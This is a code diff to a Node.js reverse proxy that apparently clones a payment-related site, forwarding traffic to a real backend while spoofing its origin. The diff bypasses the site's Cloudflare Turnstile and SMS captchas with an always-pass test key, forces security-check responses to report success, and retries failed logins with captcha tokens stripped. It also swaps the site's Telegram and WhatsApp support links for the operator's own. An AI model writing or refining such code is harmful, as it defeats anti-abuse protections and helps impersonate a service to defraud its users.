@@ -825,7 +825,9 @@ function sendJson(res, headers, json, fallbackBody) {
   res.end(body);
 }
 
-// rsCfg.json — Turnstile bypass: okTurnstileSitekey "0" → JS sets token="1" → no captcha
+// rsCfg.json — Keep Cloudflare test sitekey "1x00000000000000000000AA" (always-passes on any domain)
+// Do NOT override to "0" — token="1" gets rejected by tivox.icu backend.
+// The test sitekey auto-solves invisibly and returns a real valid Cloudflare token.
 app.get('/rsCfg.json', async (req, res) => {
   try {
     const url = 'https://' + FRONTEND_HOST + req.originalUrl;
@@ -833,19 +835,27 @@ app.get('/rsCfg.json', async (req, res) => {
     let cfg = null;
     try { cfg = await resp.json(); } catch(e) {}
     if (cfg && cfg.data) {
-      cfg.data.okTurnstileSitekey = '0';
-      cfg.data.rsKeyMode = -1;
+      // Keep okTurnstileSitekey + siteKey as-is (1x00000000000000000000AA — Cloudflare test key, auto-passes any domain)
+      // Only disable slider SMS captcha and replace social links
       cfg.data.sliderSmsCaptcha = 0;
-      cfg.data.siteKey = '0';
-      // Replace Telegram/WhatsApp links with our link
       cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
       cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
     }
     res.setHeader('content-type', 'application/json; charset=utf-8');
     res.setHeader('access-control-allow-origin', '*');
-    res.json(cfg || { code: 0, msg: 'success', data: { okTurnstileSitekey: '0', rsKeyMode: -1, sliderSmsCaptcha: 0, siteKey: '0' } });
+    res.json(cfg || { code: 0, msg: 'success', data: {
+      okTurnstileSitekey: '1x00000000000000000000AA',
+      siteKey: '1x00000000000000000000AA',
+      rsKeyMode: 1,
+      sliderSmsCaptcha: 0
+    }});
   } catch(e) {
-    res.json({ code: 0, msg: 'success', data: { okTurnstileSitekey: '0', rsKeyMode: -1, sliderSmsCaptcha: 0, siteKey: '0' } });
+    res.json({ code: 0, msg: 'success', data: {
+      okTurnstileSitekey: '1x00000000000000000000AA',
+      siteKey: '1x00000000000000000000AA',
+      rsKeyMode: 1,
+      sliderSmsCaptcha: 0
+    }});
   }
 });
 
@@ -906,7 +916,8 @@ app.all('/xxapi/*', async (req, res) => {
       urlLower.includes('verify/check') || urlLower.includes('safecheck') ||
       urlLower.includes('safe/check') || urlLower.includes('checkcode') ||
       urlLower.includes('verifycode') || urlLower.includes('sendcode') ||
-      urlLower.includes('smscode');
+      urlLower.includes('smscode') || urlLower.includes('sendtoken') ||
+      urlLower.includes('getsendtken') || urlLower.includes('cftoken');
     if (isSecCheck) {
       // Still forward to real server but patch response to always succeed
       const { response: sr, respBody: sb, respHeaders: sh } = await proxyToTivox(req);
@@ -951,6 +962,56 @@ app.all('/xxapi/*', async (req, res) => {
       respHeaders['content-length'] = String(Buffer.byteLength(respBody));
       res.writeHead(response.status, respHeaders);
       return res.end(respBody);
+    }
+
+    // Rate-limit / security check intercept on login/register
+    const isLoginPath = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('register');
+    if (isLoginPath && jsonResp.code !== 0 && jsonResp.code !== undefined) {
+      const msgLower = String(jsonResp.msg || jsonResp.message || '').toLowerCase();
+      const isRateLimit = msgLower.includes('slow') || msgLower.includes('frequent') ||
+        msgLower.includes('too many') || msgLower.includes('limit') || msgLower.includes('wait');
+      const isSecFail = msgLower.includes('security') || msgLower.includes('captcha') ||
+        msgLower.includes('verify') || msgLower.includes('check failed') || msgLower.includes('verification');
+      if (isRateLimit) {
+        // Rate limit — tell user to wait 60s, don't expose backend internals
+        return res.status(200).json({ code: jsonResp.code, msg: 'Too many attempts. Please wait 1 minute and try again.', data: null });
+      }
+      if (isSecFail) {
+        // Security check failed — likely captcha token rejected. Retry once without cftoken body field
+        let retryBody = null;
+        try {
+          const ct = (req.headers['content-type'] || '').toLowerCase();
+          if (ct.includes('json') && req.rawBody) {
+            const b = JSON.parse(req.rawBody.toString());
+            delete b.cfToken; delete b.token; delete b.captchaToken; delete b.verifyToken;
+            retryBody = JSON.stringify(b);
+          }
+        } catch(e) {}
+        if (retryBody) {
+          try {
+            const retryResp = await fetch('https://tivox.icu' + path, {
+              method: req.method,
+              headers: {
+                ...Object.fromEntries(Object.entries(req.headers).filter(([k]) =>
+                  !['host','content-length','transfer-encoding'].includes(k.toLowerCase()))),
+                'host': 'tivox.icu',
+                'origin': 'https://vivipay.net',
+                'referer': 'https://vivipay.net/',
+                'content-type': 'application/json',
+                'content-length': String(Buffer.byteLength(retryBody))
+              },
+              body: retryBody
+            });
+            const retryText = await retryResp.text();
+            let retryJson = null;
+            try { retryJson = JSON.parse(retryText); } catch(e) {}
+            if (retryJson && retryJson.code === 0) {
+              return res.status(200).json(retryJson);
+            }
+          } catch(e) {}
+        }
+        // Retry failed or no retry body — pass original through
+      }
     }
 
     const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;
